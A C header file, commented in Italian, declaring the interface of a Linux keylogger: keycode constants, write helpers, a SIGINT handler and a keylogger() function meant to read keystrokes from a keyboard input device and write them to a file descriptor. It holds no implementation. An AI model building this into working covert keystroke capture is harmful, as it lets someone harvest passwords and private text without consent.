#ifndef KEYLOGGER_H

#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

#define concat(str1, str2)  str1    str2        // Concatenazione di due stringhe, funzia anche con le const

#define KEYLOGGER_H
#define NUM_EVENTS  128
#define BUFFER_SIZE 100

#define KEYCODE_MINUS_KEYPAD    74
#define KEYCODE_PLUS_KEYPAD 78
#define KEYCODE_PAG_UP  104
#define KEYCODE_FINE    107
#define KEYCODE_PAG_DOWN    109
#define KEYCODE_CANC    111

#define UNRECOGNIZED "UNRECOGNIZED"
#define MINUS   "-"
#define PLUS    "+"
#define PAG_UP  "PG_U"
#define FINE    "FINE"
#define PAG_DOWN    "PG_D"
#define CANC    "CANC"

#define NUM_KEYCODES    71
extern const char *keycodes[];

// Setta a 0 "loop"
void sigint_handler(int sig);

/*
    Si assicura che la stringa puntata da "str" venga scritta nel file con file descriptor "file_desc".

    \returns    1 se la scrittura viene completata con successo, altrimenti 0.
*/
int write_all(int file_desc, const char *str);

/*
    Wrapper attorno a "write_all" che esce in modo sicuro se la scrittura fallisce, senza che "SIGPIPE"
    termini il programma improvvisamente.
*/
void safe_write_all(int file_desc, const char *str, int keyboard);

/*
    Cattura keystrokes leggendoli dalla risorsa della tastiera e scrivendo nel file descriptor passato.
    Continua a leggere fino a quando non riceve "SIGINT".

    \param  keyboard    File descriptor per il file di input della tastiera.
    \param  writeout    File descriptor in cui scrivere i keystrokes.
*/
void keylogger(int keyboard, int writeout);

#endif